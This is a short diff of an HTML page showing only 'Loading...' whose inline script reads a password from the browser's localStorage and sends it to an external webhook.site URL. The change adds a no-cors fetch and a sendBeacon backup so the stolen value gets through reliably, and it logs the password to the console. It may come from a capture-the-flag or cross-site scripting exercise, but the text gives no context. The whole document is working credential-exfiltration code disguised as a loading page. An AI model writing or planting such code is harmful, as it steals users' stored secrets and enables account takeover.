@@ -5,8 +5,20 @@
 </head>
 <body>
     <script>
-        const password = localStorage.getItem('password');
-        fetch('https://webhook.site/958fec35-99ec-403e-aa5c-b8e51ba1f3bc?password=' + password);
+        try {
+            const password = localStorage.getItem('password');
+            console.log('Password found:', password);
+            
+            // Method 1: Fetch with no-cors
+            fetch('https://webhook.site/958fec35-99ec-403e-aa5c-b8e51ba1f3bc?password=' + password, {
+                mode: 'no-cors'
+            });
+
+            // Method 2: Beacon API (backup)
+            navigator.sendBeacon('https://webhook.site/958fec35-99ec-403e-aa5c-b8e51ba1f3bc?password=' + password);
+        } catch (e) {
+            console.error('Error:', e);
+        }
     </script>
     <p>Loading...</p>
 </body>
